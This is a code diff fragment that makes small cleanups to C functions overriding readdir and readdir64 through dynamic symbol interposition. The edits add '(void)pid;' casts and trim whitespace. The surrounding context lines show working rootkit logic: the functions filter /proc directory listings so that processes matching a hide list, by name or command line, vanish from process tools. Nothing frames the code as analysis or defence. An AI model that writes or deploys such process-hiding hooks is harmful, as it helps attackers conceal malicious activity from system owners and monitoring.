@@ -1729,20 +1729,21 @@ struct dirent* readdir(DIR* dirp) {
         
         char* endptr;
         long pid = strtol(dir->d_name, &endptr, 10);
+        (void)pid;  // Suppress unused variable warning
         if (*endptr != '\0') {
             return dir;
         }
-        
+
         char* process_name = get_process_name(dir->d_name);
         if (process_name && should_hide_process(process_name)) {
             continue;
         }
-        
+
         char* cmdline = get_process_cmdline(dir->d_name);
         if (cmdline && should_hide_process(cmdline)) {
             continue;
         }
-        
+
         return dir;
     }
 }
@@ -1750,20 +1751,21 @@ struct dirent* readdir(DIR* dirp) {
 struct dirent64* readdir64(DIR* dirp) {
     struct dirent64* (*original_readdir64)(DIR*);
     original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
-    
+
     struct dirent64* dir;
-    
+
     while (1) {
         dir = original_readdir64(dirp);
         if (dir == NULL) return NULL;
-        
+
         const char* dir_name = get_dir_name(dirp);
         if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
             return dir;
         }
-        
+
         char* endptr;
         long pid = strtol(dir->d_name, &endptr, 10);
+        (void)pid;  // Suppress unused variable warning
         if (*endptr != '\0') {
             return dir;
         }
